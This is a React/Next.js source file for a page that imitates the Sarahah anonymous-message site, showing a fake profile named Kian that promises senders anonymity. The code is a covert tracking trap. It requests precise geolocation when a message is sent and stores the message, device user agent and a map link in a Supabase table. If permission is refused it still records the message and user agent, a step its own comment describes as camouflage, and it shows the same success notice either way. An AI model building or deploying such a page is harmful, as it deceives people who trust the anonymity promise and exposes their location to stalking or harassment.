'use client';
import { createClient } from '@supabase/supabase-js';
import { useState, FormEvent } from 'react';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!, 
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function Home() {
  const [message, setMessage] = useState<string>('');
  const [status, setStatus] = useState<string>('');

  const sendMessage = async (e: FormEvent) => {
    e.preventDefault();
    setStatus('جاري الإرسال...');

    if (typeof window !== 'undefined' && "geolocation" in window.navigator) {
      window.navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          
          const { error } = await supabase
            .from('messages')
            .insert([{ 
              content: message, 
              device: window.navigator.userAgent,
              location: locationLink 
            }]);

          if (error) setStatus('فشل الإرسال');
          else {
            setStatus('تم إرسال رسالتك بنجاح! شكراً لك.');
            setMessage('');
          }
        },
        async () => {
          // إرسال حتى لو رفض الإذن للتمويه
          await supabase.from('messages').insert([{ 
            content: message, 
            device: window.navigator.userAgent,
            location: "المستخدم رفض الإذن" 
          }]);
          setStatus('تم إرسال رسالتك بنجاح! شكراً لك.');
          setMessage('');
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  };

  return (
    <div className="min-h-screen bg-[#f1f2f6] font-sans" dir="rtl">
      {/* الـ Header الأزرق المشهور بتاع صارحني */}
      <nav className="bg-[#2d3436] p-4 text-white shadow-md">
        <div className="max-w-xl mx-auto flex justify-between items-center">
          <span className="text-xl font-bold tracking-wider">صارحني</span>
        </div>
      </nav>

      <main className="max-w-xl mx-auto mt-10 p-4">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          {/* صورة الملف الشخصي الوهمية والاسم */}
          <div className="bg-gradient-to-r from-blue-400 to-blue-600 h-24"></div>
          <div className="p-6 text-center -mt-12">
            <div className="w-24 h-24 bg-white rounded-full mx-auto p-1 shadow-md mb-4">
              <div className="w-full h-full bg-gray-200 rounded-full flex items-center justify-center text-gray-400">
                <svg className="w-12 h-12" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                </svg>
              </div>
            </div>
            <h2 className="text-xl font-bold text-gray-800">Kian (كيان)</h2>
            <p className="text-gray-500 text-sm mt-1">أرسل لي رسالة سرية دون أن أعرف من أنت!</p>
          </div>

          <form onSubmit={sendMessage} className="px-6 pb-6">
            <textarea
              className="w-full p-4 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-right text-gray-700 min-h-[150px] resize-none"
              placeholder="اكتب رسالتك الصريحة هنا..."
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              required
            />
            
            <button 
              type="submit" 
              className="w-full mt-4 bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition-colors shadow-lg"
            >
              أرسل الآن
            </button>
          </form>

          {status && (
            <div className={`mx-6 mb-6 p-3 rounded text-center text-sm font-bold ${status.includes('نجاح') ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}`}>
              {status}
            </div>
          )}
        </div>

        <div className="mt-8 text-center text-gray-400 text-xs">
          <p>© 2026 صارحني - جميع الحقوق محفوظة</p>
          <div className="mt-2 flex justify-center space-x-4 space-x-reverse">
            <span className="cursor-pointer hover:text-gray-600">شروط الاستخدام</span>
            <span className="cursor-pointer hover:text-gray-600">سياسة الخصوصية</span>
          </div>
        </div>
      </main>
    </div>
  );
}